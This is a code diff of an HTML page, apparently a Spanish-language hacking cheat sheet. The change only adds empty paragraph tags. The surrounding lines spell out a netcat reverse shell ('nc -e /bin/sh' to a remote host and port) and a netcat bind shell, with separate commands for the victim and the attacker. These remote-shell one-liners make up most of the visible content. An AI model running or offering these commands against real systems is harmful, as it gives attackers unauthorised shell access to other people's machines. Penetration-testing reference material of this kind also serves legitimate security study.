@@ -52,6 +52,7 @@ EOF
 RPORT=<span class="hljs-number">8888</span>
 nc <span class="hljs-operator">-e</span> /bin/sh <span class="hljs-variable">$RHOST</span> <span class="hljs-variable">$RPORT</span>
 </code></pre>
+<p></p>
 <h4 class="code-line" data-line-start=11 data-line-end=12 ><a id="Netcat_bind_shell_11"></a>Netcat bind shell</h4>
 <p class="has-line-data" data-line-start="12" data-line-end="13">Víctima:</p>
 <pre><code class="has-line-data" data-line-start="14" data-line-end="17" class="language-sh">LPORT=<span class="hljs-number">8888</span>
@@ -60,4 +61,5 @@ nc <span class="hljs-operator">-l</span> -p <span class="hljs-variable">$LPORT</
 <p class="has-line-data" data-line-start="17" data-line-end="18">Atacante:</p>
 <pre><code class="has-line-data" data-line-start="19" data-line-end="21" class="language-sh">nc &lt;victim_ip&gt; <span class="hljs-number">8888</span>
 </code></pre>
+<p></p>
 </body>
